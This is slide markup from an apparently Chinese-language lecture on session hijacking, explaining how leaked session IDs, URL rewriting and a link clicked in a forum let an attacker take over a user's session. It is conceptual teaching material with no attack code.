                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="47309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309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73091">
                                            <p:txEl>
                                              <p:pRg st="7" end="7"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="49" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="47309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309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r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>会话管理：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Session </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Hijacking</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="474115" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658813" y="1554163"/>
            <a:ext cx="8000278" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>可能被泄露和猜解，黑客可以：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>获取用户的帐号</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>做任何受害者能做的事情：一个使用同样</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的攻击者将拥有和真正用户相同的特权。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"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4115">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4741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41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4115">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4741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41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4115">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4741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41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r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>认证和会话管理攻击流程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="447493" name="Picture 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1550988" y="1587500"/>
            <a:ext cx="2133600" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="447502" name="Freeform 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3608388" y="1522413"/>
            <a:ext cx="3508375" cy="207962"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="0" y="131"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="1046" y="3"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="2210" y="114"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2210" h="131">
                <a:moveTo>
                  <a:pt x="0" y="131"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="174" y="110"/>
                  <a:pt x="678" y="6"/>
                  <a:pt x="1046" y="3"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1414" y="0"/>
                  <a:pt x="1968" y="91"/>
                  <a:pt x="2210" y="114"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="57150" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="447503" name="Picture 15" descr="TN_hacker"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2" cstate="print">
            <a:lum bright="24000" contrast="42000"/>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7762875" y="4797425"/>
            <a:ext cx="1282700" cy="1487488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:srgbClr val="808080">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 16"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="7189788" y="1206500"/>
            <a:ext cx="1455737" cy="1412875"/>
            <a:chOff x="4336" y="1870"/>
            <a:chExt cx="917" cy="890"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447505" name="Rectangle 17"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm>
              <a:off x="4336" y="2616"/>
              <a:ext cx="917" cy="144"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="008000"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>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Custom Code</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447506" name="Rectangle 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4023"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Accounts</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447507" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4139"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Finance</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447508" name="Rectangle 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="426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Administration</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447509" name="Rectangle 21"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4375"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Transactions</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447510" name="Rectangle 22"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4498"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Communication</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447511" name="Rectangle 23"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4609"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Knowledge Mgmt</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447512" name="Rectangle 24"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4725"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E-Commerce</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447513" name="Rectangle 25"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="484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Bus. Functions</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="447514" name="Picture 26" descr="businesswoman"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="196850" y="2492375"/>
            <a:ext cx="1185863" cy="1417638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:srgbClr val="808080">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 41"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3989388" y="1052513"/>
            <a:ext cx="3048000" cy="450850"/>
            <a:chOff x="2513" y="663"/>
            <a:chExt cx="1920" cy="284"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447515" name="Oval 27"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2513" y="712"/>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1</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447516" name="Rectangle 28"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2849" y="663"/>
              <a:ext cx="1584" cy="240"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:no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用户发送认证信息</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 42"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3989388" y="2270125"/>
            <a:ext cx="3048000" cy="871538"/>
            <a:chOff x="2513" y="1384"/>
            <a:chExt cx="1920" cy="549"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447517" name="Oval 29"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4136" y="1432"/>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2</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447518" name="Rectangle 30"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2513" y="1384"/>
              <a:ext cx="1776" cy="549"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:no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   站点进行</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>URL</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>重写</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="115000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="20000"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="10000"/>
                </a:spcAft>
                <a:buClr>
                  <a:srgbClr val="FF0000"/>
                </a:buClr>
                <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>(i.e., </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>把</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>session</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>放到</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>URL</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>中</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>) </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="447519" name="Freeform 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3609975" y="2852738"/>
            <a:ext cx="3579813" cy="365125"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="2255" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="1222" y="227"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="0" y="19"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2255" h="230">
                <a:moveTo>
                  <a:pt x="2255" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="2083" y="38"/>
                  <a:pt x="1598" y="224"/>
                  <a:pt x="1222" y="227"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="846" y="230"/>
                  <a:pt x="255" y="62"/>
                  <a:pt x="0" y="19"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="57150" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 43"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3836988" y="4102100"/>
            <a:ext cx="4406900" cy="766763"/>
            <a:chOff x="2417" y="2584"/>
            <a:chExt cx="2776" cy="483"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447520" name="Oval 32"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2417" y="2584"/>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3</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447521" name="Rectangle 33"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2753" y="2584"/>
              <a:ext cx="2440" cy="483"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:no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用户在一个论坛中点击了</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  <a:hlinkClick r:id="rId4"/>
                </a:rPr>
                <a:t>http://www.hacker.com</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
